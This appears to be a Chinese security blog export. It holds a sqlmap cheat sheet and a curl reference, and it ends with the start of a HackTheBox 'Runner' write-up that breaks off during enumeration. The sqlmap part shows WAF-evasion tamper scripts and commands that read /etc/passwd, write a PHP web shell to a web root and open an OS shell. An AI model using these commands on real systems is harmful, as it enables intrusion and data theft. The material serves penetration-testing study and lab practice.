</span><br><span class="line">-f, --fingerprint   执行全面的 DBMS 版本指纹识别  </span><br><span class="line">  </span><br><span class="line">Enumeration:  </span><br><span class="line">-a, --all                  检索所有内容  </span><br><span class="line">-b, --banner               检索 DBMS 横幅信息  </span><br><span class="line">--current-user             检索 DBMS 当前用户  </span><br><span class="line">--current-db               检索 DBMS 当前数据库  </span><br><span class="line">--hostname                 检索 DBMS 服务器主机名  </span><br><span class="line">--is-dba                   检测 DBMS 当前用户是否为 DBA  </span><br><span class="line">--users                    枚举 DBMS 用户  </span><br><span class="line">--passwords                枚举 DBMS 用户密码哈希  </span><br><span class="line">--privileges               枚举 DBMS 用户权限  </span><br><span class="line">--roles                    枚举 DBMS 用户角色  </span><br><span class="line">--dbs                      枚举 DBMS 数据库  </span><br><span class="line">--tables                   枚举 DBMS 数据库表  </span><br><span class="line">--columns                  枚举 DBMS 数据库表的列  </span><br><span class="line">--schema                   枚举 DBMS 模式  </span><br><span class="line">--count                    检索表中条目的数量  </span><br><span class="line">--dump                     导出 DBMS 数据库表中的条目  </span><br><span class="line">--dump-all                 导出所有 DBMS 数据库表中的条目  </span><br><span class="line">--search                   搜索列、表或数据库名称  </span><br><span class="line">--comments                 检查枚举过程中的 DBMS 注释  </span><br><span class="line">--statements               检索 DBMS 中运行的 SQL 语句  </span><br><span class="line">-D DB                      指定要枚举的 DBMS 数据库  </span><br><span class="line">-T TBL                     指定要枚举的 DBMS 数据库表  </span><br><span class="line">-C COL                     指定要枚举的 DBMS 数据库表列  </span><br><span class="line">-X EXCLUDE                 排除指定的 DBMS 标识符  </span><br><span class="line">-U USER                    指定要枚举的 DBMS 用户  </span><br><span class="line">--exclude-sysdbs           枚举表时排除 DBMS 系统数据库  </span><br><span class="line">--pivot-column=PIVOTCOL    指定透视列名称  </span><br><span class="line">--where=DUMPWHERE          在导出表时使用 WHERE 条件  </span><br><span class="line">--start=LIMITSTART         指定导出表时要检索的第一条记录  </span><br><span class="line">--stop=LIMITSTOP           指定导出表时要检索的最后一条记录  </span><br><span class="line">--first=FIRSTCHAR          指定查询输出的首字符  </span><br><span class="line">--last=LASTCHAR            指定查询输出的尾字符  </span><br><span class="line">--sql-query=SQLQUERY       执行指定的 SQL 查询  </span><br><span class="line">--sql-shell                提示交互式 SQL Shell  </span><br><span class="line">--sql-file=SQLFILE         从指定文件执行 SQL 查询  </span><br><span class="line">  </span><br><span class="line">Brute force:  </span><br><span class="line">--common-tables     检查常见表的存在  </span><br><span class="line">--common-columns    检查常见列的存在  </span><br><span class="line">--common-files      检查常见文件的存在  </span><br><span class="line">  </span><br><span class="line">User-defined function injection:  </span><br><span class="line">--udf-inject        注入自定义用户定义函数  </span><br><span class="line">--shared-lib=SHLIB  共享库的本地路径  </span><br><span class="line">  </span><br><span class="line">File system access:  </span><br><span class="line">--file-read=FILE..  从后端 DBMS 文件系统读取文件  </span><br><span class="line">--file-write=FIL..  在后端 DBMS 文件系统上写入本地文件  </span><br><span class="line">--file-dest=FILE..  后端 DBMS 绝对路径用于写入文件  </span><br><span class="line">  </span><br><span class="line">Operating system access:  </span><br><span class="line">--os-cmd=OSCMD      执行操作系统命令  </span><br><span class="line">--os-shell          提示交互式操作系统 Shell  </span><br><span class="line">--os-pwn            提示 OOB Shell、Meterpreter 或 VNC  </span><br><span class="line">--os-smbrelay       一键提示 OOB Shell、Meterpreter 或 VNC  </span><br><span class="line">--os-bof            存储过程缓冲区溢出利用  </span><br><span class="line">--priv-esc          数据库进程用户权限提升  </span><br><span class="line">--msf-path=MSFPATH  Metasploit 框架安装的本地路径  </span><br><span class="line">--tmp-path=TMPPATH  远程临时文件目录的绝对路径  </span><br><span class="line">  </span><br><span class="line">Windows registry access:  </span><br><span class="line">--reg-read          读取 Windows 注册表项的值  </span><br><span class="line">--reg-add           写入 Windows 注册表项的值数据  </span><br><span class="line">--reg-del           删除 Windows 注册表项的值  </span><br><span class="line">--reg-key=REGKEY    Windows 注册表项  </span><br><span class="line">--reg-value=REGVAL  Windows 注册表项的值  </span><br><span class="line">--reg-data=REGDATA  Windows 注册表项的值数据  </span><br><span class="line">--reg-type=REGTYPE  Windows 注册表项的值类型  </span><br><span class="line">  </span><br><span class="line">General:  </span><br><span class="line">-s SESSIONFILE      从存储的会话（.sqlite）文件加载会话  </span><br><span class="line">-t TRAFFICFILE      将所有 HTTP 流量记录到文本文件  </span><br><span class="line">--abort-on-empty    在结果为空时中止数据检索  </span><br><span class="line">--answers=ANSWERS   设置预定义答案（例如：&quot;quit=N,follow=N&quot;）  </span><br><span class="line">--base64=BASE64P..  包含 Base64 编码数据的参数  </span><br><span class="line">--base64-safe       使用 URL 和文件名安全的 Base64 字母表（RFC 4648）  </span><br><span class="line">--batch             永不询问用户输入，使用默认行为  </span><br><span class="line">--binary-fields=..  结果字段具有二进制值（例如：&quot;digest&quot;）  </span><br><span class="line">--check-internet    在评估目标之前检查互联网连接  </span><br><span class="line">--cleanup           清理 DBMS 中的 sqlmap 特定 UDF 和表  </span><br><span class="line">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站  </span><br><span class="line">--crawl-exclude=..  使用正则表达式排除不需要爬取的页面（例如：&quot;logout&quot;）  </span><br><span class="line">--csv-del=CSVDEL    CSV 输出中使用的分隔符（默认：&quot;,&quot;）  </span><br><span class="line">--charset=CHARSET   使用的盲 SQL 注入字符集（例如：&quot;0123456789abcdef&quot;）  </span><br><span class="line">--dump-file=DUMP..  将导出的数据存储到自定义文件  </span><br><span class="line">--dump-format=DU..  导出数据的格式（CSV（默认）、HTML 或 SQLITE）  </span><br><span class="line">--encoding=ENCOD..  数据检索时使用的字符编码（例如 GBK）  </span><br><span class="line">--eta               显示每个输出的预计到达时间  </span><br><span class="line">--flush-session     清除当前目标的会话文件  </span><br><span class="line">--forms             解析并测试目标 URL 上的表单  </span><br><span class="line">--fresh-queries     忽略会话文件中存储的查询结果  </span><br><span class="line">--gpage=GOOGLEPAGE  使用来自指定页面编号的 Google Dork 结果  </span><br><span class="line">--har=HARFILE       将所有 HTTP 流量记录到 HAR 文件  </span><br><span class="line">--hex               在数据检索期间使用十六进制转换  </span><br><span class="line">--output-dir=OUT..  自定义输出目录路径  </span><br><span class="line">--parse-errors      从响应中解析并显示 DBMS 错误消息  </span><br><span class="line">--preprocess=PRE..  使用给定的脚本进行预处理（请求）  </span><br><span class="line">--postprocess=PO..  使用给定的脚本进行后处理（响应）  </span><br><span class="line">--repair            重新导出具有未知字符标记（？）的条目  </span><br><span class="line">--save=SAVECONFIG   将选项保存到配置 INI 文件  </span><br><span class="line">--scope=SCOPE       用正则表达式过滤目标  </span><br><span class="line">--skip-heuristics   跳过漏洞的启发式检测  </span><br><span class="line">--skip-waf          跳过 WAF/IPS 保护的启发式检测  </span><br><span class="line">--table-prefix=T..  临时表使用的前缀（默认值：&quot;sqlmap&quot;）  </span><br><span class="line">--test-filter=TE..  按有效负载和/或标题选择测试（例如 ROW）  </span><br><span class="line">--test-skip=TEST..  按有效负载和/或标题跳过测试（例如 BENCHMARK）  </span><br><span class="line">--time-limit=TIM..  设置运行时限（例如：3600 秒）  </span><br><span class="line">--unsafe-naming     禁用 DBMS 标识符转义（例如：&quot;user&quot;）  </span><br><span class="line">--web-root=WEBROOT  Web 服务器文档根目录路径（例如：&quot;/var/www&quot;）  </span><br><span class="line">  </span><br><span class="line">Miscellaneous:  </span><br><span class="line">-z MNEMONICS        使用简短的助记符（例如：&quot;flu,bat,ban,tec=EU&quot;）  </span><br><span class="line">--alert=ALERT       在发现 SQL 注入时执行主机操作系统命令  </span><br><span class="line">--beep              在提问时和/或发现漏洞时发出蜂鸣声  </span><br><span class="line">--dependencies      检查缺少的（可选）sqlmap 依赖项  </span><br><span class="line">--disable-coloring  禁用控制台输出颜色  </span><br><span class="line">--list-tampers      显示可用的篡改脚本列表  </span><br><span class="line">--no-logging        禁用日志记录到文件  </span><br><span class="line">--offline           离线模式下工作（仅使用会话数据）  </span><br><span class="line">--purge             安全地删除 sqlmap 数据目录中的所有内容  </span><br><span class="line">--results-file=R..  多目标模式下的 CSV 结果文件位置  </span><br><span class="line">--shell             提示交互式 sqlmap Shell  </span><br><span class="line">--tmp-dir=TMPDIR    用于存储临时文件的本地目录  </span><br><span class="line">--unstable          调整不稳定连接的选项  </span><br><span class="line">--update            更新 sqlmap  </span><br><span class="line">--wizard            为初学者提供简单的向导界面</span><br></pre></td></tr></table></figure><p>SQLMap 完全支持以下 DBMS：</p><table><thead><tr><th>SQLMap</th><th>fully</th><th>supports</th><th>DBMSes</th></tr></thead><tbody><tr><td><code>MySQL</code></td><td><code>Oracle</code></td><td><code>PostgreSQL</code></td><td><code>Microsoft SQL Server</code></td></tr><tr><td><code>SQLite</code></td><td><code>IBM DB2</code></td><td><code>Microsoft Access</code></td><td><code>Firebird</code></td></tr><tr><td><code>Sybase</code></td><td><code>SAP MaxDB</code></td><td><code>Informix</code></td><td><code>MariaDB</code></td></tr><tr><td><code>HSQLDB</code></td><td><code>CockroachDB</code></td><td><code>TiDB</code></td><td><code>MemSQL</code></td></tr><tr><td><code>H2</code></td><td><code>MonetDB</code></td><td><code>Apache Derby</code></td><td><code>Amazon Redshift</code></td></tr><tr><td><code>Vertica</code>，<code>Mckoi</code></td><td><code>Presto</code></td><td><code>Altibase</code></td><td><code>MimerSQL</code></td></tr><tr><td><code>CrateDB</code></td><td><code>Greenplum</code></td><td><code>Drizzle</code></td><td><code>Apache Ignite</code></td></tr><tr><td><code>Cubrid</code></td><td><code>InterSystems Cache</code></td><td><code>IRIS</code></td><td><code>eXtremeDB</code></td></tr><tr><td><code>FrontBase</code></td><td>…</td><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># GET  </span><br><span class="line">sqlmap -u &#x27;http://www.example.com/?id=1&#x27;  </span><br><span class="line">  </span><br><span class="line"># POST  </span><br><span class="line">sqlmap &#x27;http://www.example.com/&#x27; --data &#x27;id=*&#x27;  </span><br><span class="line">  </span><br><span class="line"># Cookie  </span><br><span class="line">sqlmap &#x27;http://www.example.com/&#x27; --cookie &#x27;id=*&#x27;  </span><br><span class="line">  </span><br><span class="line"># Json  </span><br><span class="line">sqlmap &#x27;http://www.example.com/&#x27; -H &#x27;Content-Type: application/json&#x27; --data &#x27;&#123;&quot;id&quot;: 1&#125;&#x27;  </span><br><span class="line">  </span><br><span class="line"># 前缀/后缀  </span><br><span class="line">sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;&#x27;&quot; --suffix=&quot;-- -&quot;  </span><br><span class="line">  </span><br><span class="line"># Request  </span><br><span class="line">sqlmap -r req.txt  </span><br><span class="line">  </span><br><span class="line">GET /?id=1 HTTP/1.1  </span><br><span class="line">Host: www.example.com  </span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0  </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  </span><br><span class="line">Accept-Language: en-US,en;q=0.5  </span><br><span class="line">Accept-Encoding: gzip, deflate  </span><br><span class="line">Connection: close  </span><br><span class="line">Upgrade-Insecure-Requests: 1  </span><br><span class="line">DNT: 1  </span><br><span class="line">If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT  </span><br><span class="line">If-None-Match: &quot;3147526947&quot;  </span><br><span class="line">Cache-Control: max-age=0  </span><br><span class="line"># 或  </span><br><span class="line">HTTP / HTTP/1.0  </span><br><span class="line">Host: www.example.com  </span><br><span class="line">  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;data&quot;: [&#123;  </span><br><span class="line">    &quot;type&quot;: &quot;articles&quot;,  </span><br><span class="line">    &quot;id&quot;: &quot;1&quot;,  </span><br><span class="line">    &quot;attributes&quot;: &#123;  </span><br><span class="line">      &quot;title&quot;: &quot;Example JSON&quot;,  </span><br><span class="line">      &quot;body&quot;: &quot;Just an example&quot;,  </span><br><span class="line">      &quot;created&quot;: &quot;2020-05-22T14:56:29.000Z&quot;,  </span><br><span class="line">      &quot;updated&quot;: &quot;2020-05-22T14:56:28.000Z&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;relationships&quot;: &#123;  </span><br><span class="line">      &quot;author&quot;: &#123;  </span><br><span class="line">        &quot;data&quot;: &#123;&quot;id&quot;: &quot;42&quot;, &quot;type&quot;: &quot;user&quot;&#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;]  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># CSRF-Token  </span><br><span class="line">sqlmap -u &quot;http://www.example.com/&quot; --csrf-token=&quot;csrf-token&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot;  </span><br><span class="line">  </span><br><span class="line"># randomiz  </span><br><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&amp;rp=29125&quot; --randomize=rp --batch  </span><br><span class="line">  </span><br><span class="line"># MD5  </span><br><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib; h=hashlib.md5(id).hexdigest()&quot; --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 随机 User-Agent  </span><br><span class="line">--random-agent  </span><br><span class="line">  </span><br><span class="line"># 绕过 WAF  </span><br><span class="line">--skip-waf  </span><br><span class="line">  </span><br><span class="line"># 设置代理，隐藏IP  </span><br><span class="line">--proxy=&quot;socks5://127.0.0.1:7890&quot;  </span><br><span class="line">--proxy-file file  # 代理列表</span><br></pre></td></tr></table></figure><p>篡改脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--tamper  </span><br><span class="line">--tamper=between,randomcase</span><br></pre></td></tr></table></figure><table><thead><tr><th>篡改脚本</th><th>描述</th></tr></thead><tbody><tr><td><code>0eunion</code></td><td>替换实例与 UNIONe0UNION</td></tr><tr><td><code>base64encode</code></td><td>对给定有效载荷中的所有字符进行 Base64 编码</td></tr><tr><td><code>between</code></td><td>将大于运算符 ( <code>&gt;</code>) 替换为<code>NOT BETWEEN 0 AND #</code>并将等于运算符 ( <code>=</code>) 替换为<code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td><code>LIMIT M, N</code>用<code>LIMIT N OFFSET M</code>对应的实例替换（MySQL）</td></tr><tr><td><code>equaltolike</code></td><td>用对应的运算符替换所有出现的相等运算符 ( <code>=</code>)<code>LIKE</code></td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>在每个关键字前添加（MySQL）版本注释</td></tr><tr><td><code>modsecurityversioned</code></td><td>包含带有（MySQL）版本注释的完整查询</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>使用（MySQL）零版本注释来包含完整查询</td></tr><tr><td><code>percentage</code></td><td><code>%</code>在每个字符前面添加百分号 ( )（例如 SELECT -&gt; %S%E%L%E%C%T）</td></tr><tr><td><code>plus2concat</code></td><td>将加法运算符 ( <code>+</code>) 替换为 (MsSQL) 函数 CONCAT() 对应项</td></tr><tr><td><code>randomcase</code></td><td>用随机大小写值替换每个关键字字符（例如 SELECT -&gt; SEleCt）</td></tr><tr><td><code>space2comment</code></td><td>将空格字符 ( ) 替换为注释 &#96;&#x2F;</td></tr><tr><td><code>space2dash</code></td><td>将空格字符 ( ) 替换为破折号注释 ( <code>--</code>)，后跟随机字符串和新行 ( <code>\n</code>)</td></tr><tr><td><code>space2hash</code></td><td>将 (MySQL) 空格字符 ( ) 替换为井号字符 ( <code>#</code>)，后跟随机字符串和换行符 ( <code>\n</code>)</td></tr><tr><td><code>space2mssqlblank</code></td><td>使用有效替代字符集中的随机空白字符替换 (MsSQL) 空格字符 ( ) 的实例</td></tr><tr><td><code>space2plus</code></td><td>将空格字符 ( ) 替换为加号 ( <code>+</code>)</td></tr><tr><td><code>space2randomblank</code></td><td>使用一组有效替代字符中的随机空白字符替换空格字符 ( )</td></tr><tr><td><code>symboliclogical</code></td><td>将 AND 和 OR 逻辑运算符替换为相应的符号运算符 ( <code>&amp;&amp;</code>and <code>|</code>)</td></tr><tr><td><code>versionedkeywords</code></td><td>将每个非函数关键字括在 (MySQL) 版本注释中</td></tr><tr><td><code>versionedmorekeywords</code></td><td>将每个关键字括在（MySQL）版本注释中</td></tr></tbody></table><p>读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --is-dba  </span><br><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;  </span><br><span class="line">  </span><br><span class="line">$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd  </span><br><span class="line">  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash  </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin  </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell  </span><br><span class="line">  </span><br><span class="line">&lt;SNIP&gt;  </span><br><span class="line">  </span><br><span class="line">os-shell&gt;  </span><br><span class="line">  </span><br><span class="line"># 无/异常输出，切换技术（E 报错）  </span><br><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell --technique=E</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Enumeration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl</title>
      <link href="/2024/09/07/tools/general/curl/"/>
      <url>/2024/09/07/tools/general/curl/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Usage: curl [options...] &lt;url&gt;</span><br><span class="line">-X,--request &lt;method&gt;          设置请求方法</span><br><span class="line">-d,--data &lt;data&gt;               POST data</span><br><span class="line">-H,--header &lt;header&gt;           设置请求头</span><br><span class="line">-A,--user-agent &lt;name&gt;         设置User-Agent</span><br><span class="line">-b, --cookie &lt;data|file&gt;        设置Cookie</span><br><span class="line">-u,--user &lt;user:passwd&gt;        Server user and passwd</span><br><span class="line">-I, --head                      输出响应头</span><br><span class="line">-i, --include                   输出响应包</span><br><span class="line">-o,--output &lt;file&gt;             写入文件</span><br><span class="line">-O,--remote-name               下载文件</span><br><span class="line">-T,--upload-file &lt;file&gt;        上传文件(PUT)</span><br><span class="line">-F,--form &lt;file=@/file;type=*;filename=*; | field=value&gt;    上传文件(POST)</span><br><span class="line">-s,--silent                    Silent mode, 无进度或错误信息</span><br><span class="line">-k,--insecure                  忽略 SSL 证书验证</span><br><span class="line">-L,--location                  跟随重定向</span><br><span class="line">-v,--verbose                   显示详细信息</span><br><span class="line">--http2                         启用HTTP/2支持</span><br><span class="line">--retry &lt;1-5&gt;                   设置重试次数</span><br><span class="line">--max-time &lt;seconds&gt;            设置执行超时时间</span><br><span class="line">--connect-timeout &lt;seconds&gt;     设置连接超时时间</span><br><span class="line">--trace -                       查看请求的所有细节 (包括请求体和响应体)</span><br><span class="line">-x,--proxy&lt;&lt;http|socks5&gt;://[user:passwd@]host:port&gt;    设置代理</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传表单</span></span><br><span class="line">curl -X POST -F &quot;file=@/path/to/your/file.txt&quot; http://example.com/upload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[-H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span>]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-F 选项会自动设置 Content-Type: multipart/form-data</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传多个表单</span></span><br><span class="line">curl -X POST -F &quot;file1=@/path/to/file1.txt&quot; -F &quot;file2=@/path/to/file2.txt&quot; http://example.com/upload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传流文件</span></span><br><span class="line">curl -X POST --data-binary @/path/to/file.bin http://example.com/upload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[-H <span class="string">&quot;Content-Type: application/octet-stream&quot;</span>]</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Json格式</span></span><br><span class="line">curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;key&quot;:&quot;value&quot;&#125;&#x27; http://example.com/api</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">data数据</span></span><br><span class="line">curl -X POST -d &quot;key1=value1&amp;key2=value2&quot; http://example.com/api</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">授权请求头</span></span><br><span class="line">-H &quot;Authorization: Bearer YOUR_TOKEN&quot;</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> General </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Runner</title>
      <link href="/2024/08/02/writeup/htb/HTB%20Runner/"/>
      <url>/2024/08/02/writeup/htb/HTB%20Runner/</url>
      
        <content type="html"><![CDATA[<h1 id="Runner-Linux-·-Medium"><a href="#Runner-Linux-·-Medium" class="headerlink" title="Runner (Linux · Medium)"></a>Runner (Linux · Medium)</h1><p>CVE-2023-42793 + CVE-2024-21626</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -Pn 10.10.11.13</span><br><span class="line"></span><br><span class="line">Nmap scan report for runner.htb (10.10.11.13)</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 979 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">43/tcp    filtered whois</span><br><span class="line">80/tcp    open     http          nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Runner - CI/CD Specialists</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">84/tcp    filtered ctf</span><br><span class="line">1053/tcp  filtered remote-as</span><br><span class="line">1119/tcp  filtered bnetgame</span><br><span class="line">1145/tcp  filtered x9-icue</span><br><span class="line">1272/tcp  filtered cspmlockmgr</span><br><span class="line">1503/tcp  filtered imtc-mcs</span><br><span class="line">1971/tcp  filtered netop-school</span><br><span class="line">2383/tcp  filtered ms-olap4</span><br><span class="line">3851/tcp  filtered spectraport</span><br><span class="line">6510/tcp  filtered mcer-port</span><br><span class="line">7007/tcp  filtered afs3-bos</span><br><span class="line">8000/tcp  open     nagios-nsca   Nagios NSCA</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/plain; charset=utf-8).</span><br><span class="line">8087/tcp  filtered simplifymedia</span><br><span class="line">9917/tcp  filtered unknown</span><br><span class="line">20222/tcp filtered ipulse-ics</span><br><span class="line">32782/tcp filtered unknown</span><br><span class="line">49154/tcp filtered unknown</span><br><span class="line">52869/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.13 -I</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Tue, 13 Aug 2024 10:00:10 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 154</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://runner.htb/</span><br></pre></td></tr></table></figure><p>添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.13 runner.htb&quot; | sudo tee -a /etc/host</span><br></pre></td></tr></table></figure><h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 